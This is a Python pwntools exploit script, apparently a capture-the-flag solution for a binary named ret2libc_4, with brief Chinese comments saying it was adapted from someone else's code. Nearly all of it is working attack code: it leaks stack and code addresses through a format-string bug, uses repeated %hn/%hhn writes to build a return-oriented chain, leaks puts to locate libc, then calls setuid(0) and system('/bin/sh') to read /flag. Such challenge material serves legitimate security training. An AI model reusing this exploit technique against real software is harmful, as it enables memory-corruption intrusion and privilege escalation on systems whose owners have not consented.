# 这题思路比较清晰 参考bss格式化字符串漏洞使用
# 但是代码不太好写，，，，因为要一个个写入覆盖
# 懒得自己写了直接参考的qq哥
from pwn import *

context(arch="amd64",os="linux",log_level="DEBUG")

p = process('/challenge/ret2libc_4')
elf = ELF('/challenge/ret2libc_4')
libc = ELF('/challenge/libc.so.6')

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%8$p")
p.recvuntil("0x")
ebp=int(str(p.recvn(12),encoding="utf-8"),16)-32
print(ebp)

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%9$p")
p.recvuntil("0x")
eip=int(str(p.recvn(12),encoding="utf-8"),16)-0x140E
print(eip)
old_eip = eip

pop_rdi = eip+0x14d3

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%43$p")
p.recvuntil("0x")
j=int(str(p.recvn(12),encoding="utf-8"),16)&0xffffffffffffff00

j -= ebp-16+(0x1e-6)*8
j>>=3

jump_3 = 0x1e+j


p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%30$hhn")

#---------------------------------#
p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*1)&0xffff)+"c%43$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%43$p")
p.recvuntil("0x")
point=int(str(p.recvn(12),encoding="utf-8"),16)
point += 2
p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str(point&0xff)+"c%30$hhn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str(((ebp+32+8*1)>>16)&0xffff)+"c%43$hn")

point += 2
p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str(point&0xff)+"c%30$hhn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str(((ebp+32+8*1)>>32)&0xffff)+"c%43$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str(pop_rdi&0xffff)+"c%"+ str(jump_3) +"$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%30$hhn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*1+2)&0xffff)+"c%43$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((pop_rdi>>16)&0xffff)+"c%"+ str(jump_3) +"$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*1+4)&0xffff)+"c%43$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((pop_rdi>>32)&0xffff)+"c%"+ str(jump_3) +"$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*1+6)&0xffff)+"c%43$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+ str(jump_3) +"$hn")
#-------------pop_rdi----------------end---------#
p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32)&0xffff)+"c%43$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32)&0xffff)+"c%"+ str(jump_3) +"$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+2)&0xffff)+"c%43$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str(((ebp+32)>>16)&0xffff)+"c%"+ str(jump_3) +"$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+4)&0xffff)+"c%43$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str(((ebp+32)>>32)&0xffff)+"c%"+ str(jump_3) +"$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+6)&0xffff)+"c%43$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+ str(jump_3) +"$hn")
#---------ebp-------------#
p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*2)&0xffff)+"c%43$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((eip+elf.got["puts"])&0xffff)+"c%"+ str(jump_3) +"$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*2+2)&0xffff)+"c%43$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str(((eip+elf.got["puts"])>>16)&0xffff)+"c%"+ str(jump_3) +"$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*2+4)&0xffff)+"c%43$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str(((eip+elf.got["puts"])>>32)&0xffff)+"c%"+ str(jump_3) +"$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*2+6)&0xffff)+"c%43$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+ str(jump_3) +"$hn")
#---------push got[puts]-------------#

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*3)&0xffff)+"c%43$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str(((eip+elf.plt["puts"]))&0xffff)+"c%"+ str(jump_3) +"$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*3+2)&0xffff)+"c%43$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str(((eip+elf.plt["puts"])>>16)&0xffff)+"c%"+ str(jump_3) +"$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*3+4)&0xffff)+"c%43$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str(((eip+elf.plt["puts"])>>32)&0xffff)+"c%"+ str(jump_3) +"$hn")


#-----------------put plt[put] end-----#

main_point = eip+0x1362
p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*4)&0xffff)+"c%43$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((main_point)&0xffff)+"c%"+ str(jump_3) +"$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*4+2)&0xffff)+"c%43$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str(((main_point)>>16)&0xffff)+"c%"+ str(jump_3) +"$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*4+4)&0xffff)+"c%43$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str(((main_point)>>32)&0xffff)+"c%"+ str(jump_3) +"$hn")


p.recvuntil("Choice >> \n")
p.send("5\n")

p.recvuntil("Bye bye~\n")
position_put = int.from_bytes(p.recvn(6), byteorder='little')
lib_base = position_put - libc.symbols['puts']
lib_system = lib_base + libc.symbols['system']
lib_setuid = lib_base + libc.symbols['setuid']
lib_bin_sh = 0x1b45bd + lib_base
#---------ret main-------------------#
p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%8$p")
p.recvuntil("0x")
ebp=int(str(p.recvn(12),encoding="utf-8"),16)-32
print(ebp)

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%9$p")
p.recvuntil("0x")
eip=int(str(p.recvn(12),encoding="utf-8"),16)-0x140E
print(eip)


p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%39$p")
p.recvuntil("0x")
j=int(str(p.recvn(12),encoding="utf-8"),16)&0xffffffffffffff00

j -= ebp-16+(0x1a-6)*8
j>>=3

jump_3 = 0x1a+j

print(hex(jump_3))

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%39$hhn")
main_point = 0x1362+eip
#---------------------------------#
p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8)&0xffff)+"c%39$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((0x14d3+eip)&0xffff)+"c%"+ str(jump_3) +"$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8+2)&0xffff)+"c%39$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str(((0x14d3+eip)>>16)&0xffff)+"c%"+ str(jump_3) +"$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8+4)&0xffff)+"c%39$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str(((0x14d3+eip)>>32)&0xffff)+"c%"+ str(jump_3) +"$hn")

#-------------pop rdi--------------------#
p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*2)&0xffff)+"c%39$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+ str(jump_3) +"$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*2+2)&0xffff)+"c%39$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+ str(jump_3) +"$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*2+4)&0xffff)+"c%39$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+ str(jump_3) +"$hn")
#-------------push 0--------------------#
p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*3)&0xffff)+"c%39$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((lib_setuid)&0xffff)+"c%"+ str(jump_3) +"$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*3+2)&0xffff)+"c%39$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str(((lib_setuid)>>16)&0xffff)+"c%"+ str(jump_3) +"$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*3+4)&0xffff)+"c%39$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str(((lib_setuid)>>32)&0xffff)+"c%"+ str(jump_3) +"$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*3+6)&0xffff)+"c%39$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+ str(jump_3) +"$hn")
#-------------push setuid--------------------#
p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*4)&0xffff)+"c%39$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((0x14d3+eip)&0xffff)+"c%"+ str(jump_3) +"$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*4+2)&0xffff)+"c%39$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str(((0x14d3+eip)>>16)&0xffff)+"c%"+ str(jump_3) +"$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*4+4)&0xffff)+"c%39$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str(((0x14d3+eip)>>32)&0xffff)+"c%"+ str(jump_3) +"$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*4+6)&0xffff)+"c%39$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+ str(jump_3) +"$hn")
#-------------pop rdi--------------------#
p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*5)&0xffff)+"c%39$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((lib_bin_sh)&0xffff)+"c%"+ str(jump_3) +"$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*5+2)&0xffff)+"c%39$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str(((lib_bin_sh)>>16)&0xffff)+"c%"+ str(jump_3) +"$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*5+4)&0xffff)+"c%39$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str(((lib_bin_sh)>>32)&0xffff)+"c%"+ str(jump_3) +"$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*5+6)&0xffff)+"c%39$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+ str(jump_3) +"$hn")
#-------------push bin/sh--------------------#
p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*6)&0xffff)+"c%39$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((lib_system)&0xffff)+"c%"+ str(jump_3) +"$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*6+2)&0xffff)+"c%39$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str(((lib_system)>>16)&0xffff)+"c%"+ str(jump_3) +"$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*6+4)&0xffff)+"c%39$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str(((lib_system)>>32)&0xffff)+"c%"+ str(jump_3) +"$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+str((ebp+32+8*6+6)&0xffff)+"c%39$hn")

p.recvuntil("Choice >> \n")
p.send("3\n")
p.recvuntil("Input your message:\n")
p.send("%"+ str(jump_3) +"$hn")
#-------------push system--------------------#


p.recvuntil("Choice >> \n")
p.send("5\n")
p.send("cat /flag\n")
p.recvrepeat(timeout=1)
# python3 /home/hacker/rop7.py